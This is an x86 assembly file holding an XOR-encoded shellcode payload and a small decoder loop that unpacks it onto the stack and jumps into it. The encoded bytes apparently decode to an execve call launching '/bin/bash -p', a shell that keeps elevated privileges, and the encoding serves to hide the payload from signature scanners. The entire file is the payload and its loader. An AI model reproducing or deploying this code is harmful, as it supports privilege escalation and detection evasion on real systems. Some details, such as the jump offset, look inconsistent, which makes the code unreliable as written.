section .text
global _start

_start:
	push ebp
	mov ebp, esp
	sub esp, 42
	mov bl, 42
	lea edi, [ebp - 42]
	;mov eax, 0xffffcab5 ; shellcode
	lea eax, [rel shellcode] ; shellcode

decrypt:
	cmp bl, 0
	je end
	mov cl, [eax]
	xor cl, 42
	mov [edi], cl
	inc edi
	inc eax
	dec bl
	jmp decrypt

end:
	lea edi, [ebp - 40]
	jmp edi

shellcode: db 0x40, 0x21, 0x7a, 0xb3, 0x78, 0x42, 0x7, 0x5a, 0x2a, 0x2a, 0xa3, 0xcb, 0x78, 0x40, 0x42, 0x42, 0x5, 0x48, 0x4b, 0x59, 0x42, 0x5, 0x48, 0x43, 0x44, 0xa3, 0xc9, 0x1b, 0xf8, 0x78, 0x7b, 0x79, 0xa3, 0xcb, 0x92, 0x21, 0x2a, 0x2a, 0x2a, 0xe7, 0xaa
